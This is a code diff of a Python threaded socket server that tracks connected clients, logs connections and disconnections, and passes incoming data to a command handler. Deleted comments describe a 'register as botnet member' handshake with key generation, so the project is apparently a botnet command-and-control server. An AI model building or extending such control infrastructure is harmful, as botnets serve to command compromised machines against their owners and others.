@@ -21,8 +21,8 @@ class Client (Thread):
 		self.connection = True
 		
 	def run (self):
-		log.log('{} connected! (socket level) ({} clients now)'.format(self.sock.getpeername()[0], len(clients)))
 		clients.append(self)
+		log.log('{} connected! (socket level) ({} clients now)'.format(self.sock.getpeername()[0], len(clients)))
 		while self.connection == True:
 			data = self.sock.recv(1024).strip('\n')
 			if not data: 
@@ -33,28 +33,12 @@ class Client (Thread):
 				
 			highClient = client.Client(self.sock.getpeername()[0], self)
 			highClient.on_command(data)
-			
-			## lets parse command
-			#arguments = commands.parse(data)
-			
-			# first command should be registering as botnet member.
-			
-		#	if arguments[0] != 'register':
-		#		clients.remove(self)
-		#		log.log('{} disconnected! Failed handshake ({} clients left)'.format(self.sock.getpeername()[0], len(clients)))
-		#		self.sock.close()
-		#		break
-				
-			# new botnet member
-		#	if len(arguments) != 2:
-		#		log.log('{} is new botnet member! Generating random key... '.format(self.sock.getpeername()[0], len(clients)))
-		#		key = hashlib.md5(str(time.time()*100000)).hexdigest().upper()
-		#		log.log('Random key generated for {}: {}'.format(self.sock.getpeername()[0], key))
-		#		command = commands.encode(['set','key',key])
-		#		self.sock.send(command)
+
 	def send(self, arg):
 		self.sock.send(arg)
 		
 	def stop(self):
+		log.log('{} got disconnected by server! ({} clients now)'.format(self.sock.getpeername()[0], len(clients)-1))
 		self.connection = False
 		self.sock.close()
+		clients.remove(self)
